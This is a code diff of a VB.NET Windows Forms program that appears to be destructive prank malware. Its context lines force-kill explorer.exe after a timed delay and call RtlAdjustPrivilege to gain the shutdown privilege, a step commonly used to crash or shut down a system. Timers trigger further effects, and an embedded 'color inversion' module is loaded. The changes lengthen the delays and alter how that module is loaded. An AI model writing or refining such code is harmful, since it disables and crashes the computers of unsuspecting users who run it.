@@ -113,7 +113,7 @@ Public Class Form2
         newthread2.Start()
         'Dim newthread3 As New Threading.Thread(AddressOf Playsound)
         'newthread3.Start()
-        Threading.Thread.Sleep(1000 * 60 * 2)
+        Threading.Thread.Sleep(1000 * 60 * 3)
         Shell("taskkill /im explorer.exe /f", 0)
         Threading.Thread.Sleep(1000 * 60)
         RtlAdjustPrivilege(&H13, &H1, &H0, &H0)
@@ -164,9 +164,9 @@ again:
 
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
         a = a + 1
-        If a = 30 Then
+        If a = 60 Then
             Timer3.Start()
-        ElseIf a = 120 Then
+        ElseIf a = 180 Then
             Timer1.Start()
         End If
     End Sub
@@ -220,8 +220,13 @@ again:
     End Sub
 End Class
 Module Program
+    Function 加载反色模块(sender As Object, args As ResolveEventArgs) As Assembly
+        If New AssemblyName(args.Name).Name = "反色模块" Then
+            Return Assembly.Load(My.Resources.反色模块)
+        End If
+    End Function
     Sub Main()
-        Assembly.Load(My.Resources.反色模块)
+        AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf 加载反色模块
         Application.EnableVisualStyles()
         Application.Run(New Form2)
     End Sub
